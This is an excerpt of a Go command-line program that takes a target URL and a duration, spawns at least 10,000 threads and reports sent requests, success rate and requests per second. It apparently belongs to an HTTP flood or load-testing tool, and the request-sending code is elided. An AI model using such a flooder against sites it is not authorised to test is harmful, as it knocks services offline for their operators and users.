...
func main() {
	if len(os.Args) != 3 {
		fmt.Println("Usage: go run raw.go <target_url> <duration_sec>")
		os.Exit(1)
	}
	...
	threads := runtime.NumCPU() * 256 // 256× oversubscription
	if threads < 10000 {
		threads = 10000
	}

	fmt.Printf(" RAW | Target: %s | Duration: %ds | Threads: %d | 100%% CPU/RAM\n", target, durSec, threads)
...
func statsTicker() {
	...
	for range ticker.C {
		...
		fmt.Printf("\r Sent: %d | 200: %d | Success: %.2f%% | RPS: %.0f", t, s, p, rps)
	}
}
